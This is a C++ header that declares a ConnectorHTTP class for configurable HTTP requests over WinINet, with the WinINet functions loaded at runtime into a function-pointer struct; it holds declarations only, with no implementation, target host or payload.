#pragma once

#include <windows.h>
#include <wininet.h>

#define DECL_API(x) decltype(x) * x

struct HTTPFUNC {
	DECL_API(LocalAlloc);
	DECL_API(LoadLibraryA);
	DECL_API(GetProcAddress);

	DECL_API(InternetOpenA);
	DECL_API(InternetConnectA);
	DECL_API(HttpOpenRequestA);
	DECL_API(HttpSendRequestA);
	DECL_API(InternetSetOptionA);
	DECL_API(InternetQueryOptionA);
	DECL_API(HttpQueryInfoA);
	DECL_API(InternetQueryDataAvailable);
	DECL_API(InternetCloseHandle);
	DECL_API(InternetReadFile);
};

class ConnectorHTTP
{
	CHAR*     user_agent;
	BOOL      ssl;
	CHAR*     http_method;
	CHAR*     server_address;
	WORD      server_port;
	CHAR*     uri;
	CHAR*     headers;
	HTTPFUNC* functions;

public:
	ConnectorHTTP();

	void  SetConfig(BOOL Ssl, CHAR* UserAgent, CHAR* Method, CHAR* Address, WORD Port, CHAR* Uri, CHAR* Headers);
	PBYTE SendData(PBYTE data, ULONG data_size, ULONG* recv_size);
};